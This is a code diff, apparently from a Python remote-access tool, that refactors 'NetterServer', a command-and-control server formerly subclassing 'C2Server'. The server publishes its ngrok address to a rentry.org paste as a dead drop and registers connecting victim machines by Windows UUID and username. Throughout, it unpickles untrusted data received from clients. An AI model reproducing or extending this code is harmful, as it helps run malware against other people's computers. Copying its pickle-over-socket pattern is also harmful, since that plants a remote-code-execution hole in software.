@@ -7,7 +7,8 @@ from typing import Optional
 from .rentry import Rentry
 from .enums import NetterClient, PacketType
 from .handler import ClientHandler
-from .logger import C2Server
+from .logger import Logging
+from .back_end import backEnd_server
 
 class ClientWrapper:
     BYTES_CHUNK: int = 2048
@@ -18,7 +19,7 @@ class ClientWrapper:
         self.socket = socket_
         self.netServer: "NetterServer" = netServer
 
-    def send_(self, packetType: int, data: bytes | str) -> None:
+    def send_(self, packetType: PacketType, data: bytes | str) -> None:
         if isinstance(data, str):
             data = data.encode("utf-8")
 
@@ -31,7 +32,7 @@ class ClientWrapper:
         for chunk in range(0, len(data), self.BYTES_CHUNK):
             self.socket.sendall(data[chunk : chunk + self.BYTES_CHUNK])
 
-    def receive(self) -> bytes:
+    def receive(self) -> int | dict[str, bytes]:
         packetLength: int = int.from_bytes(self.socket.recv(4), "big")
         packet_type: int = int.from_bytes(self.socket.recv(2), "little")
         data, total_received = bytearray(), 0
@@ -45,16 +46,19 @@ class ClientWrapper:
             data.extend(chunk)
             total_received += len(chunk)
 
-        if (packet_type in [PacketType.CONSOLE_INFO,PacketType.CONSOLE_ERROR,PacketType.CONSOLE_WARNING] and self.netServer):
+        if (packet_type in [PacketType.CONSOLE_INFO, PacketType.CONSOLE_ERROR, PacketType.CONSOLE_WARNING] and self.netServer):
             self.netServer.console_log(
                 data.decode("utf-8"),
                 level = PacketType._value2member_map_[packet_type].name[8:],
             )
             return len(data)
 
-        return bytes(data)
+        return {
+            "packetType": PacketType._value2member_map_.get(packet_type, PacketType.UNKNOWN).name,
+            "data": bytes(data)
+        }
 
-class NetterServer(C2Server):
+class NetterServer(Logging):
     bindAddress: tuple[str, int] = None
 
     ngrokAddress: str = None
@@ -63,8 +67,13 @@ class NetterServer(C2Server):
 
     _logs: list = None
 
-    def __init__(self, bind_address: Optional[tuple[str, int]] = None, ngrokConfig: Optional[pyngrok.ngrok.PyngrokConfig] = None) -> None:
+    def __init__(self,
+            bind_address: Optional[tuple[str, int]] = None,
+            ngrokConfig: Optional[pyngrok.ngrok.PyngrokConfig] = None
+    ) -> None:
+
         super().__init__(self)
+
         self.ngrokConfig: pyngrok.ngrok.PyngrokConfig = ngrokConfig
         self.bindAddress = bind_address if bind_address else ("localhost", 5000)
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -104,9 +113,9 @@ class NetterServer(C2Server):
 
         if useRentry:
             Rentry.edit(
-                urlName=self.rentryUrlName,
-                edit_code=self.rentryEditCode,
-                text=self.ngrokAddress,
+                urlName = self.rentryUrlName,
+                edit_code = self.rentryEditCode,
+                text = self.ngrokAddress,
             )
 
             if (rentryContent := Rentry.get_content("https://rentry.org/" + self.rentryUrlName)) is None:
@@ -132,16 +141,16 @@ class NetterServer(C2Server):
             self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             self.socket.bind(self.bindAddress)
             self.socket.listen(5)
-            self.console_log(
-                "Server is listening on %s:%s" % self.bindAddress,
-            )
+
+            self.console_log("Server is listening on %s:%s" % self.bindAddress,)
+            backEnd_server(self).start() # Starting server-side
 
             while self.alive is True:
                 clientSocket: ClientWrapper = ClientWrapper(
                     self.socket.accept()[0], self
                 )
 
-                if _deviceInformation := pickle.loads(clientSocket.receive()):
+                if _deviceInformation := pickle.loads(clientSocket.receive()["data"]):
                     device: NetterClient = NetterClient(clientSocket,
                         hashlib.sha256(_deviceInformation["Windows_UUID"].encode()).hexdigest()[:20],
                         _deviceInformation["Username"],
